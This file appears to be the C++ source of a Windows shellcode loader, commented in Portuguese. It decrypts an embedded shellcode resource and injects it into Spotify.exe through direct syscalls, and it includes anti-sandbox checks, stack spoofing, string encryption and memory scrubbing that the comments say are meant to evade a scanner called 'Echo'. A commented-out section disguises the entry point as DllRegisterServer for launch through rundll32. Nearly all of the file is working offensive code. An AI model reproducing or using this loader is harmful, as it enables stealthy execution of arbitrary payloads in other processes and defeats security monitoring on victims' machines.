#include <windows.h>
#include <vector>
#include <string>
#include "header.h"
#include "evasion.h"
#include "strenc.h"
#include "syscalls.h"
#include "resource.h"
#include "sckey.h"


extern "C" SYSCALL_ENTRY g_SyscallTable[SYSCALL_TABLE_SIZE] = { 0 };

extern BOOL InitializeSyscalls();
extern BOOL InitStackSpoofer();
extern DWORD FindProcessByName(const wchar_t* processName);
extern bool injectShellcode(std::vector<uint8_t>& shellcode, HANDLE hProcess, DWORD processId);

DWORD GetSSN(const char* functionName)
{
    // So PEB-walk. Nenhum fallback via IAT (GetModuleHandleW/L"ntdll.dll")
    // pra Echo nao ter string "ntdll.dll" cleartext na memoria do modulo.
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    if (!hNtdll) {
        return (DWORD)-1;
    }

    BYTE* fn = (BYTE*)PebGetProcAddr(hNtdll, functionName);
    if (!fn) {
        return (DWORD)-1;
    }

    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        DWORD ssn = *(DWORD*)(fn + 4);
        return ssn;
    }

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*       dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64*     nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords     = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);

    int alvo = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (_stricmp((char*)(base + names[i]), functionName) == 0) { alvo = (int)i; break; }

    if (alvo < 0) {
        return (DWORD)-1;
    }

    for (int delta = 1; delta < 32; delta++)
    {
        for (int sinal = -1; sinal <= 1; sinal += 2)
        {
            int idx = alvo + (sinal * delta);
            if (idx < 0 || idx >= (int)exp->NumberOfNames) continue;

            BYTE* viz = base + funcs[ords[idx]];
            if (viz[0] == 0x4C && viz[1] == 0x8B && viz[2] == 0xD1 && viz[3] == 0xB8) {
                DWORD calculatedSSN = *(DWORD*)(viz + 4) - (DWORD)(sinal * delta);
                return calculatedSSN;
            }
        }
    }

    return (DWORD)-1;
}

PVOID FindSyscallAddress()
{
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    if (!hNtdll) return nullptr;

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*   dos = (IMAGE_DOS_HEADER*)base;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    
    IMAGE_NT_HEADERS64* nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }

    BYTE* text = base + nt->OptionalHeader.BaseOfCode;
    DWORD size = nt->OptionalHeader.SizeOfCode;

    for (DWORD i = 0; i < size - 2; i++)
        if (text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3) {
            return (PVOID)&text[i];
        }

    return nullptr;
}

BOOL InitializeSyscalls()
{
    PVOID syscallAddr = FindSyscallAddress();
    if (!syscallAddr) return FALSE;

    // decrypta cada nome num buffer local, usa, zera. nenhum
    // cleartext persiste em memoria apos a chamada de GetSSN.
    char nameBuf[48]{};

    #define RESOLVE_ONE(idx, literal) do { \
        ENC_BUF(nameBuf, literal); \
        DWORD _ssn = GetSSN(nameBuf); \
        for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
            ((volatile char*)nameBuf)[_k] = 0; \
        if (_ssn == (DWORD)-1) return FALSE; \
        g_SyscallTable[idx].ssn            = _ssn; \
        g_SyscallTable[idx].syscallAddress = syscallAddr; \
    } while (0)

    RESOLVE_ONE(0,  "NtAllocateVirtualMemory");
    RESOLVE_ONE(1,  "NtFreeVirtualMemory");
    RESOLVE_ONE(2,  "NtWriteVirtualMemory");
    RESOLVE_ONE(3,  "NtProtectVirtualMemory");
    RESOLVE_ONE(4,  "NtCreateThreadEx");
    RESOLVE_ONE(5,  "NtOpenProcess");
    RESOLVE_ONE(6,  "NtClose");
    RESOLVE_ONE(7,  "NtQuerySystemInformation");
    RESOLVE_ONE(8,  "NtCreateSection");
    RESOLVE_ONE(9,  "NtMapViewOfSection");
    RESOLVE_ONE(10, "NtUnmapViewOfSection");
    RESOLVE_ONE(11, "NtDelayExecution");
    RESOLVE_ONE(12, "NtOpenThread");

    #undef RESOLVE_ONE
    ScrubEncTLS();
    return TRUE;
}

void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
{
    HMODULE self = GetModuleHandleW(nullptr);
    HRSRC   r    = FindResourceW(self, MAKEINTRESOURCEW(IDR_SHELLCODE), RT_RCDATA);
    if (!r) return;
    DWORD   sz = SizeofResource(self, r);
    HGLOBAL g  = LoadResource(self, r);
    if (!g || !sz) return;
    const uint8_t* p = (const uint8_t*)LockResource(g);
    if (!p) return;

    // Reverte XOR com stream de 16 bytes + rol8 do pack_bin.
    sc.resize(sz);
    uint32_t s = kScKey;
    uint8_t stream[16];
    for (int k = 0; k < 16; ++k) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;
        stream[k] = (uint8_t)(s & 0xFF);
    }
    for (DWORD i = 0; i < sz; ++i) {
        uint8_t v = p[i];
        v = (uint8_t)((v >> 3) | (v << 5));
        sc[i] = v ^ stream[i & 15];
    }
}

DWORD FindProcessByName(const wchar_t* processName)
{
    SIZE_T   bufSize = 0x10000;
    PVOID    buf = nullptr;
    NTSTATUS st;
    int      attempts = 0;

    auto freeBuf = [&]() {
        if (buf) {
            PVOID  pb = buf;
            SIZE_T ps = 0;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            buf = nullptr;
        }
        };

    do {
        attempts++;

        freeBuf();

        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &buf, 0, &allocSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) return 0;

        ULONG returnLen = 0;
        st = SysNtQuerySystemInformation(SystemProcessInformation, buf,
            (ULONG)bufSize, &returnLen);

        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize = (returnLen > bufSize) ? (returnLen + 0x1000) : (bufSize * 2);
        }

        if (attempts > 10) {
            freeBuf();
            return 0;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) {
        freeBuf();
        return 0;
    }

    PMY_SYSTEM_PROCESS_INFORMATION info = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
    DWORD pid = 0;

    while (info)
    {
        if (info->ImageName.Buffer && info->ImageName.Length > 0 &&
            _wcsicmp(info->ImageName.Buffer, processName) == 0)
        {
            pid = (DWORD)(ULONG_PTR)info->UniqueProcessId;
            break;
        }

        if (info->NextEntryOffset == 0) break;
        info = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)info + info->NextEntryOffset);
    }

    freeBuf();
    return pid;
}
bool enumerateThreadsViaSyscall(DWORD targetPID, std::vector<DWORD>& threadIds)
{
    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;

    do {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        
        PVOID allocBase = nullptr;
        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &allocBase, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!NT_SUCCESS(st)) {
            return false;
        }
        
        buf = allocBase;

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && bufSize < 0x1000000);

    if (!NT_SUCCESS(st)) {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        return false;
    }

    PMY_SYSTEM_PROCESS_INFORMATION procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buf;

    while (procInfo)
    {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == targetPID)
        {
            PMY_SYSTEM_THREAD_INFORMATION threadInfo = (PMY_SYSTEM_THREAD_INFORMATION)(procInfo + 1);
            
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++)
            {
                DWORD tid = (DWORD)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;
                threadIds.push_back(tid);
            }

            if (buf) {
                PVOID pb = buf;
                SIZE_T ps = bufSize;
                SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            }
            return threadIds.size() > 0;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)procInfo + procInfo->NextEntryOffset);
    }

    if (buf) {
        PVOID pb = buf;
        SIZE_T ps = bufSize;
        SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
    }
    return false;
}

HANDLE openThreadViaSyscall(DWORD threadId)
{
    MY_CLIENT_ID clientId;
    ZeroMemory(&clientId, sizeof(clientId));
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

    MY_OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = NULL;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE hThread = NULL;
    NTSTATUS st = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &clientId);
    
    if (NT_SUCCESS(st) && hThread) {
        return hThread;
    } else {
        return NULL;
    }
}

bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE hExistingThread)
{
    SIZE_T scSz = ((sc.size() + 0xFFF) & ~0xFFF);
    if (scSz < 0x1000) scSz = 0x1000;

    HANDLE hScSec = NULL;
    PVOID  scBase = SectionAllocRemote(hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);

    if (!scBase)
    {
        NTSTATUS st = SysNtAllocateVirtualMemory(hProcess, &scBase, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(st)) {
            return false;
        }
    }

    JitterDelay(10, 30);

    std::vector<uint8_t> wrapper;
    wrapper.resize(sc.size() + 16);
    memcpy(wrapper.data(), sc.data(), sc.size());
    
    wrapper[sc.size()] = 0xEB;
    wrapper[sc.size() + 1] = 0xFE;
    for (size_t i = sc.size() + 2; i < wrapper.size(); i++) {
        wrapper[i] = 0x90;
    }
    
    SIZE_T written = 0;
    NTSTATUS st = SysNtWriteVirtualMemory(hProcess, scBase, wrapper.data(), wrapper.size(), &written);
    if (!NT_SUCCESS(st)) {
        return false;
    }

    JitterDelay(10, 30);

    HANDLE hThread = NULL;
    NTSTATUS st2 = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                       hProcess, scBase, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(st2)) {
        return false;
    }
    
    JitterDelay(500, 1000);
    
    SysNtClose(hThread);
    return true;
}

bool injectShellcode(std::vector<uint8_t>& sc, HANDLE hProcess, DWORD processId)
{
    std::vector<DWORD> threadIds;
    if (!enumerateThreadsViaSyscall(processId, threadIds)) {
        return false;
    }

    if (!threadIds.empty()) {
        HANDLE hThread = openThreadViaSyscall(threadIds[0]);
        if (hThread) {
            bool result = injectViaExistingThread(sc, hProcess, hThread);
            SysNtClose(hThread);
            if (result) return true;
        } else {
            for (size_t i = 1; i < threadIds.size(); i++) {
                hThread = openThreadViaSyscall(threadIds[i]);
                if (hThread) {
                    bool result = injectViaExistingThread(sc, hProcess, hThread);
                    SysNtClose(hThread);
                    if (result) return true;
                }
            }
        }
    }

    return false;
}

BOOL ExecuteInjectionHijack(HWND hwnd)
{
    (void)hwnd;
    // anti-sandbox: maquina real tem >= 2 processadores
    DWORD nProc = PebGetNumberOfProcessors();
    if (nProc < 2) return FALSE;

    if (!InitializeSyscalls()) return FALSE;
    if (!InitStackSpoofer())   return FALSE;

    std::vector<uint8_t> sc;
    LoadShellcodeFromBytes(sc);
    if (sc.empty()) return FALSE;

    DWORD pid = FindProcessByName(WENC(L"Spotify.exe"));
    ScrubEncTLS();
    if (!pid) return FALSE;

    HANDLE hProcess = NULL;
    MY_CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    MY_OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);

    NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (!NT_SUCCESS(st) || !hProcess) return FALSE;

    bool bResult = injectShellcode(sc, hProcess, pid);

    // zera o blob do shellcode no nosso heap depois de injetado.
    // Echo scaneia all_process_memory; sem isso o shellcode fica visivel aqui.
    if (!sc.empty()) {
        volatile uint8_t* p = sc.data();
        for (size_t i = 0; i < sc.size(); ++i) p[i] = 0;
        std::vector<uint8_t>().swap(sc);
    }

    Sleep(2000);
    SysNtClose(hProcess);
    ScrubEncTLS();
    return bResult;
}

// rundll32.exe Inject.dll,Start
// =============================================================================
// Entry via rundll32.exe <dll>,Start
//
// rundll32 chama a export com assinatura:
//     void CALLBACK Start(HWND, HINSTANCE, LPSTR cmdline, int nCmdShow)
// =============================================================================
//static volatile LONG g_started = 0;
//
//static DWORD WINAPI StartThread(LPVOID)
//{
//    ExecuteInjectionHijack(nullptr);
//    return 0;
//}
//
//// nome do export disfarçado de API COM-like.
//// chamar via: rundll32.exe Inject.dll,DllRegisterServer
//extern "C" __declspec(dllexport)
//void CALLBACK DllRegisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
//{
//    UNREFERENCED_PARAMETER(hwnd);
//    UNREFERENCED_PARAMETER(hinst);
//    UNREFERENCED_PARAMETER(lpszCmdLine);
//    UNREFERENCED_PARAMETER(nCmdShow);
//
//    // single-shot: segundo rundll32 na mesma sessao e no-op
//    if (InterlockedCompareExchange(&g_started, 1, 0) != 0) return;
//
//    // worker em thread propria pra devolver ao rundll32 rapido.
//    HANDLE h = CreateThread(nullptr, 0, StartThread, nullptr, 0, nullptr);
//    if (!h) return;
//
//    WaitForSingleObject(h, INFINITE);
//    CloseHandle(h);
//}
//
//BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID)
//{
//    if (reason == DLL_PROCESS_ATTACH) {
//        DisableThreadLibraryCalls(hModule);
//    }
//    return TRUE;
//}

int main()
{
    // console pra debug local. nome do titulo/separador tudo via ENC()
    // pra sair de .rdata plaintext.
    AllocConsole();
    FILE* fp;
    // nao usar ENC() aqui: tls_buf eh unico e os dois ENC() na mesma
    // call sobrescrevem um ao outro -> CRT dispara _invalid_parameter.
    // "CONOUT$" e "w" sao strings genericas de CRT, nao identificam nada.
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);

    printf("%s", ENC("\n============\n loader\n============\n\n"));

    BOOL result = ExecuteInjectionHijack(NULL);

    printf("%s", ENC("press any key\n"));
    getchar();

    return result ? 0 : 1;
}
